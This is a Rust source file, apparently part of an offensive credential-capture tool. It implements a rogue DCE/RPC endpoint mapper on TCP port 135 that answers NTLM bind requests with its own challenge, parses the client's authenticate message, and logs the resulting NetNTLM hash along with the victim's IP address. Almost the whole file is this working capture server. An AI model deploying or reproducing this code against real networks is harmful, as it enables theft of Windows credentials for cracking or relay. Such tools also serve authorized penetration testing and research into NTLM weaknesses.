//! Rogue DCE/RPC endpoint mapper (TCP 135) capturing NTLM during the bind/auth handshake.

use std::net::SocketAddr;
use std::sync::Arc;

use anyhow::Result;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};

use crate::capture::model::{CaptureArtifact, Protocol};
use crate::constants::Service;
use crate::protocols::dcerpc;
use crate::protocols::ntlm;

use super::ServerContext;

pub async fn serve(listener: TcpListener, ctx: Arc<ServerContext>) -> Result<()> {
    loop {
        let (stream, peer) = listener.accept().await?;
        let ctx = ctx.clone();
        tokio::spawn(async move {
            let _ = handle(stream, peer, ctx).await;
        });
    }
}

async fn handle(mut stream: TcpStream, peer: SocketAddr, ctx: Arc<ServerContext>) -> Result<()> {
    loop {
        let mut header = [0u8; 16];
        if stream.read_exact(&mut header).await.is_err() {
            break;
        }
        let frag_len = u16::from_le_bytes([header[8], header[9]]) as usize;
        if !(16..=1 << 16).contains(&frag_len) {
            break;
        }
        let mut rest = vec![0u8; frag_len - 16];
        if stream.read_exact(&mut rest).await.is_err() {
            break;
        }
        let mut pdu_bytes = header.to_vec();
        pdu_bytes.extend_from_slice(&rest);
        let Some(pdu) = dcerpc::Pdu::parse(&pdu_bytes) else {
            break;
        };
        let call_id = pdu.call_id;
        match pdu.ptype {
            dcerpc::PTYPE_BIND => {
                let token = pdu.auth.as_ref().map(|a| &a.3);
                let reply = match token.and_then(|t| ntlm::message_type(t)) {
                    Some(1) => {
                        let challenge = ctx.build_challenge(Service::Dcerpc);
                        dcerpc::bind_ack(call_id, Some(&challenge))
                    }
                    _ => dcerpc::bind_ack(call_id, None),
                };
                stream.write_all(&reply).await?;
            }
            dcerpc::PTYPE_AUTH3 => {
                if let Some((_, _, _, token)) = &pdu.auth
                    && ntlm::message_type(token) == Some(3)
                {
                    let ch = ctx.challenge_for(Service::Dcerpc);
                    if let Some(net) = ntlm::parse_type3(token, &ch) {
                        ctx.sink.artifact(CaptureArtifact::netntlm(
                            Protocol::Dcerpc,
                            peer.ip(),
                            &net,
                        ));
                    }
                }
                stream.write_all(&dcerpc::auth3(call_id)).await?;
            }
            _ => {
                // Unsupported PDU; close.
                break;
            }
        }
    }
    Ok(())
}
